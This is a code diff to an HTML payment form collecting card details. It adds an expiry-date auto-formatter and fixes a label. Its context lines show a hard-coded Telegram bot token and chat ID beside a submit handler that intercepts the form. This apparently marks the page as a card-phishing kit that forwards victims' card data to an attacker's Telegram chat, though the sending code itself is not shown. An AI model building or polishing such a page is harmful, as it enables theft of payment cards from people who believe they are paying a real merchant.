@@ -184,8 +184,8 @@
 
                 <div class="row">
                     <div class="form-group" style="flex: 1;">
-                        <input type="text" id="expirationDate" name="expiry_date" placeholder="Exp/date (MM/YY)" required>
-                        <label for="expirationDate">Exp/date (MM/YY)</label>
+                        <input type="text" id="expirationDate" name="expiry_date" placeholder="Exp date (MM/YY)" required>
+                        <label for="expirationDate">Exp date (MM/YY)</label>
                         <div class="error" id="expiryError">Please enter a valid, non-expired date (MM/YY)</div>
                     </div>
                     <div class="form-group" style="flex: 1;">
@@ -276,6 +276,15 @@
             return defaultZipRegex.test(zipcode);
         }
 
+        // Auto-format expiration date
+        function formatExpirationDate(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            input.value = value.slice(0, 5); // Limit to MM/YY (5 characters)
+        }
+
         // Form submission handling
         document.addEventListener('DOMContentLoaded', function() {
             const form = document.getElementById('paymentForm');
@@ -292,6 +301,11 @@
             // Telegram bot configuration
             const botToken = '7103630373:AAFVJ_kia1ilw3C043wVG478q81bhZjt7gI';
             const chatId = '6134592216';
+
+            // Add input event listener for expiration date auto-formatting
+            expirationInput.addEventListener('input', function() {
+                formatExpirationDate(expirationInput);
+            });
 
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -425,4 +439,3 @@
     </script>
 </body>
 </html>
-
